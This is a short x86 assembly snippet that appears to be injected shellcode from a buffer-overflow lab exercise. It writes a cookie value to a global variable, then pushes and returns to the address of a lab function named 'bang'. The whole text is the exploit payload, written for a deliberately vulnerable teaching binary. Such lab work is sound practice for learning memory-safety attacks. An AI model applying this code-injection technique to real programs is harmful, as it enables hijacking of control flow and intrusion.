movl $0x5516f6f3, 0x804a1bc       # move cookie to global_value
pushl $0x8048cf6		# push addr of bang on stack
ret
.align 4                # Following will be aligned on multiple of 4
.long   0xffffffff      # A 4-byte constant
.long   0x00000000      # Padding
